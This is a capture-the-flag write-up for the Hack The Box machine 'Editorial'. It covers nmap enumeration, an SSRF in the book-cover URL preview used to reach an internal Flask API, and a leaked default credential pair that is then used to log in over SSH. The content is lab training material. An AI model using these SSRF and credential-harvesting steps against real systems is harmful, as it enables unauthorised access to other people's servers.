
### 1- Enumeration
 
```bash
sudo nmap -sV -sC -v 10.10.11.20 -oN nmap

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
|_  256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editorial.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


```bash
sudo nano etc/hosts

editorial.htb 10.10.11.20
```

![[Pasted image 20240617035832.png]]
Users Enumeration 
```
John Kat.
Stephen K.
José Sara.
```


About us Email
![[Pasted image 20240617042313.png]]

```
submissions@tiempoarriba.htb
```

Adding `tiempoarriba.htb` to `/etc/hosts` -->
http://tiempoarriba.htb/ redirect to http://editorial.htb/ 


#### Website Functions

![[Pasted image 20240617042930.png]]

uploads location : http://editorial.htb/static/uploads/

#### SSRF at book cover URL Preview

![[Pasted image 20240617050812.png]]


![[Pasted image 20240617051238.png]]

#### From the structure of the Website we can guess that it runs flask which by default running on port 5000

![[Pasted image 20240617203715.png]]

![[Pasted image 20240617203807.png]]

Found that there is api endpoints in response 

```js
/api/latest/metadata/messages/promos
/api/latest/metadata/messages/coupons
/api/latest/metadata/messages/authors
/api/latest/metadata/messages/how_to_use_platform
/api/latest/metadata/changelog
/api/latest/metadata
```

new_authors api endpoint 
```
http://127.0.0.1:5000/api/latest/metadata/messages/authors
```
![[Pasted image 20240617203519.png]]

![[Pasted image 20240617203339.png]]


retrieve messages sent to new authors which contains default username and password
```json
{"template_mail_message":"Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."}
```

```
username : dev && password : dev080217_devAPI!@
```

now we can use this creds to connect via ssh port 22
```bash
ssh dev@editorial.htb 

password: dev080217_devAPI!@
```

Now we got initial access &  user flag
![[Pasted image 20240617204652.png]]